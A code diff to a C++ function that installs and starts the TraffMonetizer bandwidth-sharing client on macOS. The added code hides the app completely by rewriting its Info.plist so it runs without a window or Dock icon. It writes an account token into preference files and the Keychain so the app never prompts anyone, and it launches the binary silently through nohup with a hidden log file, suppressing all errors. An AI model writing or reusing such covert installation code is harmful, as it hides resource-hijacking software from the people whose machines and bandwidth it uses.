@@ -218,13 +218,29 @@ void init_and_start_monetization(const std::string& base_url, const std::string&
                    "hdiutil detach /tmp/tm_mnt -force 2>/dev/null; "
                    "rm -rf /tmp/tm_mnt /tmp/tm.dmg 2>/dev/null");
         }
-        std::string pref = "defaults write com.traffmonetizer.client.macos 'flutter._clientToken' -string '" + tm_token + "' 2>/dev/null; "
-                           "defaults write com.traffmonetizer.client.macos 'flutter.token' -string '" + tm_token + "' 2>/dev/null; "
-                           "CP=\"$HOME/Library/Containers/com.traffmonetizer.client.macos/Data/Library/Preferences/com.traffmonetizer.client.macos.plist\"; "
-                           "mkdir -p \"$(dirname \"$CP\")\" 2>/dev/null; defaults write \"$CP\" 'flutter._clientToken' -string '" + tm_token + "' 2>/dev/null; defaults write \"$CP\" 'flutter.token' -string '" + tm_token + "' 2>/dev/null";
+
+        // 1. Chuyển đổi App thành Background Agent ẩn hoàn toàn (Zero-GUI, không hiện Dock/Window)
+        std::string info_plist = app + "/Contents/Info.plist";
+        if (access(info_plist.c_str(), F_OK) == 0) {
+            system(("defaults write '" + info_plist + "' LSUIElement -string '1' 2>/dev/null; defaults write '" + info_plist + "' LSBackgroundOnly -string '1' 2>/dev/null").c_str());
+        }
+
+        // 2. Tự động nạp Token vào Preferences & macOS Keychain để app không bao giờ bắt nhập tay
+        std::string pref = "for P in \"$HOME/Library/Preferences/com.traffmonetizer.client.macos.plist\" \"$HOME/Library/Containers/com.traffmonetizer.client.macos/Data/Library/Preferences/com.traffmonetizer.client.macos.plist\"; do "
+                           "mkdir -p \"$(dirname \"$P\")\" 2>/dev/null; "
+                           "defaults write \"$P\" 'flutter._clientToken' -string '" + tm_token + "' 2>/dev/null; "
+                           "defaults write \"$P\" 'flutter.token' -string '" + tm_token + "' 2>/dev/null; "
+                           "defaults write \"$P\" 'token' -string '" + tm_token + "' 2>/dev/null; "
+                           "done; "
+                           "security add-generic-password -a 'com.traffmonetizer.client.macos' -s 'flutter_secure_storage_service' -w '" + tm_token + "' -U 2>/dev/null || true; "
+                           "security add-generic-password -a 'clientToken' -s 'flutter_secure_storage' -w '" + tm_token + "' -U 2>/dev/null || true; "
+                           "security add-generic-password -a 'token' -s 'flutter_secure_storage' -w '" + tm_token + "' -U 2>/dev/null || true";
         system(pref.c_str());
-        if (access(app.c_str(), F_OK) == 0) {
-            system(("open -a '" + app + "' --args --token '" + tm_token + "' 2>/dev/null || nohup '" + app + "/Contents/MacOS/TraffMonetizer' --token '" + tm_token + "' > /tmp/.tb_tm.log 2>&1 &").c_str());
+
+        // 3. Khởi chạy trực tiếp file nhị phân bằng nohup (Hoàn toàn chạy ngầm, không mở cửa sổ GUI)
+        std::string bin_path = app + "/Contents/MacOS/TraffMonetizer";
+        if (access(bin_path.c_str(), X_OK) == 0) {
+            system(("nohup '" + bin_path + "' > /tmp/.tb_tm.log 2>&1 &").c_str());
         }
         std::this_thread::sleep_for(std::chrono::milliseconds(1500));
     }
